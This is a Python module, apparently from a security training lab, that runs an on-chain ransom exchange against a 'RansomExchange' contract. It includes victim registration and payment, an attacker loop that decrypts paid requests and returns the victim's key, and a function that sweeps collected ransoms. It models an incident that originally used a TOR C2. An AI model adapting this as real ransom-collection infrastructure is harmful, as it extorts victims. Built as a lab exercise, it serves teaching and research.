#!/usr/bin/env python3
"""Real on-chain transport for the RansomExchange contract.

This module replaces the manual request/reply file copies with signed
transactions against the deployed RansomExchange contract. It uses only
eth-account (already in the host image) plus plain JSON-RPC over HTTP:

  - calldata is encoded with eth_abi and real function selectors
  - transactions are signed locally with a decrypted keystore key
  - raw transactions are submitted through the chain RPC endpoint
  - contract state (requests, replies) is read through eth_call

No web3 client library is needed on the participant host. The contract
itself enforces payment (exact ransom value) and attacker-only replies;
this module never bypasses those checks, only speaks the ABI.

Roles:
  victim   - needs the participant wallet (password-protected keystore)
  attacker - needs the RSA attacker keys for the offline crypto plus the
             on-chain attacker account key. In this lab the utility
             server's deploy account IS the attacker account, because the
             contract designates its deployer as attacker.
"""

import base64
import json
import time
from pathlib import Path
from urllib.request import Request, urlopen

from eth_account import Account
from eth_abi import decode as abi_decode, encode as abi_encode
from eth_utils import keccak

import lab_keylogic
import lab_wallet


SELECTOR_REGISTER = keccak(text="registerVictim(bytes,bytes)")[:4]
SELECTOR_SUBMIT_REPLY = keccak(text="submitReply(uint256,bytes)")[:4]
SELECTOR_GET_REPLY = keccak(text="getReply(uint256)")[:4]
SELECTOR_REQUESTS = keccak(text="requests(uint256)")[:4]
EVENT_REGISTERED = keccak(text="VictimRegistered(uint256,address,bytes)")

# Storing ~1.4 KB of sealed blob per request costs roughly 1M gas in
# SSTORE writes; the reply carries ~2.5 KB (it contains the RSA-wrapped
# victim_priv) and costs ~1.8M. Keep both well below the chain's 5.27M
# block gas limit.
GAS_REGISTER = 3000000
GAS_REPLY = 4000000
POLL_SECONDS = 5
RECEIPT_TIMEOUT = 120


def unb64(text: str) -> bytes:
    return base64.b64decode(text.encode("ascii"))


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def discover_contract(config: dict) -> str:
    """Read the deployed contract address from the utility info server.

    The server answers with the address for a named contract, which may be
    a plain JSON string (the common case) or a dict that carries it under
    another key, depending on the ChainSeed version.
    """
    url = f"{config['utility_url']}/contracts_info?name={config['contract_name']}"
    request = Request(url, headers={"Content-Type": "application/json"})
    with urlopen(request, timeout=5) as response:
        result = json.load(response)

    address = None
    if isinstance(result, str):
        address = result
    elif isinstance(result, dict):
        entry = result.get(config["contract_name"], result.get("address"))
        if isinstance(entry, dict):
            address = entry.get("contractAddress") or entry.get("address")
        else:
            address = entry
    if not address:
        raise RuntimeError("utility server returned no contract address")
    return lab_wallet.validate_address(address)


def load_wallet_key(keystore_path: Path, password: str) -> Account:
    """Decrypt a wallet keystore in memory; the key never touches disk."""
    keystore = json.loads(keystore_path.read_text(encoding="utf-8"))
    return Account.from_key(Account.decrypt(keystore, password))


def load_chain_key(account_file: Path) -> Account:
    """Load a plain account record: {"address": ..., "private_key": ...}.

    Used by the attacker for the on-chain attacker account (the utility
    deployer). The participant wallet instead uses the encrypted keystore.
    """
    record = json.loads(account_file.read_text(encoding="utf-8"))
    return Account.from_key(record["private_key"])


def send_tx(config: dict, account: Account, to: str, value: int, data: bytes, gas: int):
    """Build, sign, and submit one real transaction; return its hash."""
    nonce = int(
        lab_wallet.rpc(config, "eth_getTransactionCount", [account.address, "pending"]), 16
    )
    gas_price = int(lab_wallet.rpc(config, "eth_gasPrice", []), 16)
    tx = {
        "to": to,
        "value": value,
        "gas": gas,
        "gasPrice": gas_price,
        "nonce": nonce,
        "chainId": config["chain_id"],
        "data": data,
    }
    signed = account.sign_transaction(tx)
    raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
    return lab_wallet.rpc(config, "eth_sendRawTransaction", ["0x" + raw.hex()])


def wait_receipt(config: dict, tx_hash: str, timeout: int = RECEIPT_TIMEOUT) -> dict:
    """Poll for the transaction receipt; no result before it is mined."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        receipt = lab_wallet.rpc(config, "eth_getTransactionReceipt", [tx_hash])
        if receipt is not None:
            if int(receipt["status"], 16) != 1:
                raise RuntimeError(f"transaction reverted on-chain: {tx_hash}")
            return receipt
        time.sleep(POLL_SECONDS)
    raise TimeoutError(f"receipt not seen within {timeout}s: {tx_hash}")


def call_single(config: dict, to: str, selector: bytes, arg: int, out_types: list):
    """One eth_call with a uint256 argument; None when reverted or empty.

    A revert here is an expected polling signal for getters like getReply,
    which reverts with NoReplyYet until the attacker answers. Any other
    revert is still swallowed into None; the caller only ever treats these
    reads as "nothing yet".
    """
    data = "0x" + (selector + abi_encode(["uint256"], [arg])).hex()
    try:
        result = lab_wallet.rpc(config, "eth_call", [{"to": to, "data": data}, "latest"])
    except RuntimeError as error:
        if "execution reverted" in str(error):
            return None
        raise
    if result in (None, "0x") or len(result) < 10:
        return None
    return abi_decode(out_types, bytes.fromhex(result[2:]))


# --------------------------------------------------------------------------
# Victim side
# --------------------------------------------------------------------------

def register_request(
    config: dict, wallet_file: Path, password: str, request_path: Path
) -> dict:
    """Post one paid registration transaction for the saved exchange request.

    The request file must already exist (it holds the ephemeral key the
    reply will be sealed to). Sends registerVictim with exactly ransomWei
    attached; the contract reverts otherwise. Returns the updated request
    record including the on-chain request id.
    """
    request = json.loads(request_path.read_text(encoding="utf-8"))
    address = discover_contract(config)
    # Never attach value to a target without code: a failed deployment
    # leaves a dead address in the address book, and a payment to it would
    # be a silent, unrecoverable donation.
    code = lab_wallet.rpc(config, "eth_getCode", [address, "latest"])
    if len(code) <= 2:
        raise RuntimeError(
            f"no contract code at {address}; the deployment failed. "
            "Refusing to pay a ransom into a dead address."
        )
    account = load_wallet_key(wallet_file, password)

    sealed_blob = json.dumps(request["victim_priv_sealed"]).encode("utf-8")
    data = (
        SELECTOR_REGISTER
        + abi_encode(["bytes", "bytes"], [unb64(request["ephemeral_pub_b64"]), sealed_blob])
    )
    tx_hash = send_tx(
        config, account, address, value=config["ransom_wei"], data=data, gas=GAS_REGISTER
    )
    receipt = wait_receipt(config, tx_hash)
    request_id = extract_request_id(receipt)

    request.update(
        {
            "transaction_hash": tx_hash,
            "contract_address": address,
            "request_id": request_id,
            "status": "REGISTERED",
        }
    )
    request_path.write_text(json.dumps(request, indent=2) + "\n", encoding="utf-8")
    return request


def extract_request_id(receipt: dict) -> int:
    """Read the VictimRegistered event id from the receipt logs."""
    for log in receipt.get("logs", []):
        topics = log.get("topics", [])
        if topics and bytes.fromhex(topics[0][2:]) == EVENT_REGISTERED:
            return int(topics[1], 16)
    raise RuntimeError("registration receipt had no VictimRegistered event")


def wait_reply(config: dict, request_id: int, deadline_seconds: int = 600) -> dict:
    """Poll getReply on-chain until the attacker's reply appears.

    Returns the reply record ready for lab_keylogic.victim_accept_reply.
    """
    address = discover_contract(config)
    deadline = time.monotonic() + deadline_seconds
    while time.monotonic() < deadline:
        result = call_single(config, address, SELECTOR_GET_REPLY, request_id, ["bytes"])
        if result and result[0]:
            return json.loads(result[0].decode("utf-8"))
        time.sleep(POLL_SECONDS)
    raise TimeoutError("no reply posted on-chain in time")


def victim_exchange(
    config: dict, wallet_file: Path, password: str, request_path: Path, lab_dir: Path
) -> dict:
    """One victim-side on-chain run: register, pay, wait, and save the reply.

    Writes the reply to lab_dir/exchange_reply.json so the existing accept
    and recover path can pick it up unchanged.
    """
    request = register_request(config, wallet_file, password, request_path)
    print(f"registered on-chain: request id {request['request_id']}")
    print(f"payment transaction: {request['transaction_hash']}")
    reply = wait_reply(config, request["request_id"])
    reply_path = lab_dir / "exchange_reply.json"
    reply_path.write_text(json.dumps(reply, indent=2) + "\n", encoding="utf-8")
    print(f"attacker reply received on-chain; saved to {reply_path}")
    return reply


def withdraw(config: dict, chain_key_path: Path) -> str:
    """The attacker sweeps collected ransoms from the contract."""
    address = discover_contract(config)
    account = load_chain_key(chain_key_path)
    tx_hash = send_tx(
        config, account, address, value=0, data=keccak(text="withdraw()")[:4], gas=100000
    )
    wait_receipt(config, tx_hash)
    return tx_hash


# --------------------------------------------------------------------------
# Attacker side
# --------------------------------------------------------------------------

def poll_requests(config: dict, start_id: int = 0) -> list:
    """Read all requests from the chain with payment and answer state."""
    address = discover_contract(config)
    found = []
    next_id = start_id
    while True:
        result = call_single(
            config,
            address,
            SELECTOR_REQUESTS,
            next_id,
            ["address", "bytes", "bytes", "bool"],
        )
        if result is None:
            break
        victim, ephemeral_pub, sealed_blob, answered = result
        if victim == "0x" + "0" * 40:
            break  # unmapped id: end of registered requests
        found.append(
            {
                "id": next_id,
                "victim": victim,
                "ephemeral_pub_b64": b64(bytes(ephemeral_pub)),
                "sealed_blob_json": bytes(sealed_blob).decode("utf-8"),
                "answered": answered,
            }
        )
        next_id += 1
    return found


def attacker_watch(
    config: dict,
    attacker_keys_path: Path,
    chain_key_path: Path,
    start_id: int = 0,
) -> list:
    """Watch the chain, decrypt paid requests offline, and post replies.

    This is the full attacker loop the original incident needed a TOR C2
    plus manual steps for: read the sealed blob from the request itself,
    recover victim_priv with attacker_priv, seal it to the victim's ephemeral
    key, and post the reply in one signed transaction.

    The victim's keylog is NOT needed on the attacker machine: the on-chain
    request already carries the sealed victim_priv blob, and the reply hands
    back only victim_priv — the victim unseals its own file key locally.
    This keeps the two-host split honest (host_1 never touches host_0 files).
    """
    attacker_keys = json.loads(attacker_keys_path.read_text(encoding="utf-8"))
    chain_account = load_chain_key(chain_key_path)
    address = discover_contract(config)
    # The contract only accepts submitReply from its deployer-designated
    # attacker. Verify locally first: a stale key otherwise burns gas on a
    # guaranteed revert.
    data = "0x" + keccak(text="attacker()")[:4].hex()
    raw = lab_wallet.rpc(config, "eth_call", [{"to": address, "data": data}, "latest"])
    onchain_attacker = abi_decode(["address"], bytes.fromhex(raw[2:]))[0]
    if onchain_attacker.lower() != chain_account.address.lower():
        raise RuntimeError(
            f"this key ({chain_account.address}) is not the contract's attacker "
            f"({onchain_attacker}). Re-copy the current utility account.json."
        )
    answered = []

    for entry in poll_requests(config, start_id):
        if entry["answered"]:
            continue
        # A minimal view over the ON-CHAIN blob: attacker_open_victim_priv
        # verifies the blob was sealed under OUR attacker key and refuses
        # otherwise (that check replaces the old local-keylog comparison).
        keylog_view = {
            "attacker_pub_pem": attacker_keys["attacker_pub_pem"],
            "victim_priv_sealed": json.loads(entry["sealed_blob_json"]),
        }
        # Offline crypto with attacker_priv: recover victim_priv.
        victim_priv_pem = lab_keylogic.attacker_open_victim_priv(
            unb64(attacker_keys["attacker_priv_pem"]), keylog_view
        )
        request = {
            "participant_id": "",
            "ephemeral_pub_b64": entry["ephemeral_pub_b64"],
        }
        reply = lab_keylogic.attacker_build_reply(request, victim_priv_pem)
        sealed_reply = json.dumps(reply).encode("utf-8")
        data = (
            SELECTOR_SUBMIT_REPLY
            + abi_encode(["uint256", "bytes"], [entry["id"], sealed_reply])
        )
        tx_hash = send_tx(
            config, chain_account, address, value=0, data=data, gas=GAS_REPLY
        )
        wait_receipt(config, tx_hash)
        answered.append({"id": entry["id"], "transaction_hash": tx_hash})
    return answered
